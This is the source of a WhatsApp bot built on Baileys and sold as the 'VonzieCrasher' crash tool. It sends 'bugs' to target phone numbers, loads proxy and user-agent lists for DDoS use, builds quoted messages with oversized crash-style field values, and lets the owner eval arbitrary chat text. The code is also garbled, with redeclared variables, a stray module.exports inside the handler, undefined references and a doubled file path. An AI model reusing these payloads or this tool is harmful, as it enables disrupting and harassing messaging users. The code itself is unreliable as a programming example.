require('./all/settings/settings');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');

const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = ryu = async (ryu, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ryu.user.id.split(":")[0] || ryu.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

// Buat Grup
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database And Lain"
const botNumber = await ryu.decodeJid(ryu.user.id);
const isBot = botNumber.includes(senderNumber)
const newOwner = JSON.parse(fs.readFileSync("./all/Database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./all/Database/premium.json"))

const isPremium = premium.includes(m.sender)
const isOwner = newOwner.includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// function Group
const groupMetadata = isGroup ? await ryu.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')


        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
sleep } = require('./all/myfunc');

// fungsi waktu real time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
 // IMPORT TOOLS DIDOS TXT
const uatxt = await axios.get('https://raw.githubusercontent.com/QioExec/proxy-ua/main/ua.txt')
const proxytxt = await axios.get('https://raw.githubusercontent.com/QioExec/proxy-ua/main/proxy.txt')
const { checkApproval, approveScript, isApproved, validateApprovalData, checkScriptIntegrity } = require('./all/security/adiwajs')
const config = require('./all/security/adiwConfig')

const isCmd = true; // fix sementara, sesuaikan logika sebenarnya

async function main() {
    if (!(await isApproved())) {
        if (m.sender.includes(config.approval.num) && budy.includes(config.approval.text)) {
            await approveScript(m.sender, ryu.authState.creds.pairingCode);
            await replyRyu(config.approval.greet);
        } else {
            await checkApproval();
        }
    }
}

main();

if (!await isApproved() && isCmd) {
    return;
}
checkScriptIntegrity();
if (await isApproved()) {
    validateApprovalData(ryu.authState.creds.pairingCode);
}
if (!fs.existsSync('./all/approval')) {
    ryu.sendMessage(config.approval.num + '@s.whatsapp.net', { text: 'Connect lost!\nHarap Mendapatkan persetujuan dari *RyuMa*' })
    fs.writeFileSync('./all/approval', '', 'utf8');
}
// Membuat file data.json jika belum ada
if (!fs.existsSync('./all/security/data.json')) {
  fs.writeFileSync('./all/security/data.json', JSON.stringify({
    buyer: [],
    reseller: [],
    partner: [],
    moderator: [],
    ceo: [],
    blacklist: [],
    expired: 0
  }));
}

// Fungsi untuk mengakses data
const getData = () => {
  const data = JSON.parse(fs.readFileSync('./all/security/data.json'));
  return data;
};

// Fungsi untuk menambahkan buyer
const addBuyer = (nomor) => {
  const data = getData();
  data.buyer.push(nomor);
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan reseller
const addReseller = (nomor) => {
  const data = getData();
  data.reseller.push(nomor);
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan partner
const addPartner = (nomor) => {
  const data = getData();
  data.partner.push(nomor);
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan moderator
const addModerator = (nomor) => {
  const data = getData();
  data.moderator.push(nomor);
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan ceo
const addCeo = (nomor) => {
  const data = getData();
  data.ceo.push(nomor);
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk menghapus user
const deleteUser = (nomor) => {
  const data = getData();
  const indexBuyer = data.buyer.indexOf(nomor);
  const indexReseller = data.reseller.indexOf(nomor);
  const indexPartner = data.partner.indexOf(nomor);
  const indexModerator = data.moderator.indexOf(nomor);
  const indexCeo = data.ceo.indexOf(nomor);
  const indexBlacklist = data.blacklist.indexOf(nomor);

  if (indexBuyer !== -1) {
    data.buyer.splice(indexBuyer, 1);
  }
  if (indexReseller !== -1) {
    data.reseller.splice(indexReseller, 1);
  }
  if (indexPartner !== -1) {
    data.partner.splice(indexPartner, 1);
  }
  if (indexModerator !== -1) {
    data.moderator.splice(indexModerator, 1);
  }
  if (indexCeo !== -1) {
    data.ceo.splice(indexCeo, 1);
  }
  if (indexBlacklist !== -1) {
    data.blacklist.splice(indexBlacklist, 1);
  }

  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk mengatur expired
const setExpired = (waktu) => {
  const data = getData();
  data.expired = waktu;
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};

// Fungsi untuk menambahkan ke blacklist
const addBlacklist = (nomor) => {
  const data = getData();
  data.blacklist.push(nomor);
  fs.writeFileSync('./all/security/data.json', JSON.stringify(data));
};
const fs = require('fs');
const path = './all/security/data.json';

let data = {};
try {
    // Pastikan file ada
    if (!fs.existsSync(path)) {
        console.warn("[WARNING] data.json tidak ditemukan, membuat file baru...");
        fs.writeFileSync(path, JSON.stringify({}, null, 2)); // bikin file kosong
    }

    // Baca isi file
    const raw = fs.readFileSync(path, 'utf8');

    // Coba parse JSON
    data = JSON.parse(raw);

} catch (err) {
    console.error("[ERROR] data.json rusak atau tidak bisa dibaca:", err.message);
    console.warn("[WARNING] Mengatur data.json ke default kosong...");
    data = {}; // fallback ke objek kosong

    // Perbaiki file yang rusak
    fs.writeFileSync(path, JSON.stringify(data, null, 2));
}

module.exports = data;
const expired = data.expired;

// Lakukan pengecekan expired
const now = new Date().getTime();
if (now > new Date(expired).getTime()) {
  console.log("Expired");
} else {
  console.log("Not Expired");
}

const replybar = (teks) => {
    ryu.sendMessage(m.chat, { 
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: global.title,
                previewType: "PHOTO",
                thumbnailUrl: global.image.Reply,
                thumbnail: ``,
                sourceUrl: global.website
            }
        }
    }, { quoted: zeromodes });
}      
const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": budy || m.mtype,
    "description": "By Orderkuota",
    "location": {
      "degreesLatitude": -99999999999,
      "degreesLongitude": -99999999999,
      "name": "Orderkuota"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}                

// Cmd in Console
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`➤ New Messages`));
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Tanggal: ${new Date().toLocaleString()} \n` +
` ├─ > Pesan: ${m.body || m.mtype} \n` +
` ├─ > Pengirim: ${m.pushname} \n` +
` ╰─ > JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ╭─ > Grup: ${groupName} \n` +
` ╰─ > GroupJid: ${m.chat}`
)
);
}
console.log();
}

//==========================================//
const { os, baileys, child_process, crypto, cookie,  fetch, process, ms, speed, syntaxerror, nodecron } = modul
//==========================================//

//==========================================//   
const userSessions = {};
//==========================================//

// AKHIR FUNC BUG //
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await ryu.sendMessage(from, {text: 'Loading...'},  { quoted: zeromodes })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await ryu.sendMessage(from, {text: nln[i], edit: key }, { quoted: zeromodes });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await ryu.sendMessage(from, {text: 'Loading...'},  { quoted: zeromodes })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await ryu.sendMessage(from, {text: nln[i], edit: key }, { quoted: zeromodes });
}}  

async function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
//==========================================//

// Done Ress //
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = ` 𝗦𝘂𝗰𝗰𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴𝘀!!
💬 *_${command}_* Sent To : 
📱 ${pepec}

 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟭𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀 𝗢𝗿 𝗗𝗲𝗹𝗲𝘁𝗲 𝗔𝗰𝗰𝗲𝘀𝘀 ❕`

  let buttons = [
        { buttonId: ".tqto", buttonText: { displayText: "𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "",
                newsletterName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀"
            }
        },
        footer: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await ryu.sendMessage(m.chat, buttonMessage, { quoted: zeromodes });
}

// Random Emoji //       
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Bot //

const thumb = fs.readFileSync('./media/logo.mp4');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('command/case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `💫 こんにちは、ユーザー様。何をお探しですか？ ${prefix+mean}?\n💫 メニュー名 : ${prefix+mean}`
ryu.sendMessage(m.chat, { image: thumb, caption: response }, {quoted: zeromodes})
}}

const sound = { 
key: {
fromMe: false, 
participant: `62857734669112@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "120363390274692764@newsletter",
newsletterName: `ᴄʜᴀɴɴᴇʟ ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: ryu.decodeJid(ryu.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `ʙʏ ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await ryu.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363401151695566@newsletter`,
newsletterName: `Vonzie`,
jpegThumbnail: "",
caption: '𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓',
inviteExpiration: Date.now() + 1814400000
}
}}


let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
ping = `ping : ${latensi.toFixed(4)} × ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`

//variable gambar
const valensya = fs.readFileSync('./media/logo.mp4logo.mp4')
//end

const qtext2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓" }}}

const replyRyu = (teks) => {
ryu.sendMessage(
        m.chat,
        {
          document: fs.readFileSync("./package.json"),
          fileName: `Hai ${pushname}`,
          fileLength: "99999999999999",
          caption: teks,
          mimetype: "image/png",
          headerType: 9,
          jpegThumbnail: fkethmb,
          contextInfo: { 
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: namaowner,
 newsletterJid: idsaluran,
 serverMessageId: 143
}}}, {quoted:qtext2})
}

const ftoko = {
      key: {
        fromMe: false,
        participant: `6285773466911@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀`,
            description: `${pushname} order`,
            currencyCode: "IDR",
            priceAmount1000: "999999999999",
            retailerId: `⏤͟͟͞͞RyuMa Official`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
const hw = {
  key: {
    participant: '6285773466911@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `ⱤɎɄ₥₳ ₱Ɇ₥ɄⱠ₳ J₳₦₲₳₦ Đł ₴Ɇ₦₲₲ØⱠ`,
      jpegThumbnail: ""
    }
  }, 
quoted: sound
} 

    const isCreator = JSON.parse(fs.readFileSync('./all/Database/owner.json'));

    const isAccryuDev = [BotNum, ...isCreator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

const ryuReply = (teks) => {
ryu.sendMessage(m.chat, {
  image: { url: `https://files.catbox.moe/6y35hh.jpg` }, //gif nya
        caption: teks,
        footer: " ",
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: true,
                title: `𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀`,
                body: `⏤͟͟͞͞RyuMa Official`,
                thumbnailUrl: `https://files.catbox.moe/6y35hh.jpg`,
                sourceUrl: `https://xnxx.com`,
                mediaType: 1,
                renderLargerThumbnail: false
        }
    },
 buttons: [
  {
   buttonId: ".menu", 
    buttonText: { 
      displayText: '⍣𝐁𝐚͠𝐜͜𝐤 𝐌͠𝐞͜𝐧͠𝐮⍣' 
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: hw })
}
const zeromodes = {
key: {
participant: `13135559098@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
contactMessage: {
displayName: `𝐙𝐞𝐫𝐨 𝐌𝐨𝐝𝐞`,
vcard: true,
thumbnailUrl: `https://files.catbox.moe/6y35hh.jpg`,
sendEphemeral: true
}},
status: 1,
participant: "13135559098@s.whatsapp.net"
}

const reaction = async (jidss, emoji) => {
ryu.sendMessage(jidss, { react: { text: emoji, key: m.key }})}


switch (command) {

case 'menu':{
let anj = `
> こんにちは、Vonzie Crasher スクリプト ユーザーの皆さん。開発者として、これを良いことに使用していただければとても嬉しいです。
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏


🌹 الحب الحقيقي هو الذي يقربك إلى الله لا يبعدك عنه.

> Cinta sejati adalah cinta yang mendekatkanmu kepada Allah, bukan yang menjauhkanmu dari-Nya.

`

sock.relayMessage(m.chat, {
    interactiveMessage: {
contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
      title: ownername,
      body: '',
      thumbnailUrl: "https://telegra.ph/file/4e60fce32bf5179c2eaf4.jpg",
      sourceUrl: `https://www.dpr.go.id`,
      mediaType: 1,
      renderLargerThumbnail: true
    }
 },
 header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/539012045_745537058346694_1512031191239726227_n.enc",
mimetype: "application/pdf",
fileSha256: "+gmvvCB6ckJSuuG3ZOzHsTBgRAukejv1nnfwGSSSS/4=",
fileLength: "999999999999",
pageCount: 0,
mediaKey: "MWO6fI223TY8T0i9onNcwNBBPldWfwp1j1FPKCiJFzw=",
fileName: "Rbcdepp",
fileEncSha256: "ZS8v9tio2un1yWVOOG3lwBxiP+mNgaKPY9+wl5pEoi8=",
directPath: "/v/t62.7119-24/539012045_745537058346694_1512031191239726227_n.enc",
mediaKeyTimestamp: "1756370084",
},
hasMediaAttachment: true,
   },
      body: {
        text: null 
      },
      footer: {
        text: "《𝙕𝙮𝙪𝙧𝙤𝙓𝙯》"
      },
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "《𝙕𝙮𝙪𝙧𝙤𝙓𝙯》",
            url: "https://t.me/Rbcdepp",
            copy_code: "Rbcdepp",
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "select here",
            button_title: "《𝙕𝙮𝙪𝙧𝙤𝙓𝙯》"
          },
          tap_target_configuration: {
            title: " X ",
            description: "bomboclard",
            canonical_url: "https://t.me/Rbcdepp",
            domain: "https://www.dpr.go.id",
            button_index: 0
          }
        }),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "list selection",
              sections: [
                {
                  title: "gw putyh btw",
                  highlight_label: "🤤",
                  rows: [
                    { title: "Title #1", description: "Description #1", id: "id#1" },
                    { title: "Title #2", description: "Description #2", id: "id#2" }
                  ]
                }
              ],
              has_multiple_buttons: true
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "url site",
              url: "https://www.dpr.go.id",
              has_multiple_buttons: true
            })
          },
          {
           name: "cta_copy",
           buttonParamsJson: JSON.stringify({
              display_text: "copy",
              copy_code: '𝚋𝚢 Rbcdepp',
              has_multiple_buttons: true
            })
          },
        ],
        messageParamsJson: JSON.stringify({
          bottom_sheet: {
            in_thread_buttons_limit: 1,
            divider_indices: [1, 2, 3],
            list_title: "List Button baru",
            button_title: "kau hytam ya?"
          }
        })
      }
    }
  }, {userJid:m.sender})
break
}

// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.ryuReply(evaled);
} catch (err) {
m.ryuReply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.ryuReply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
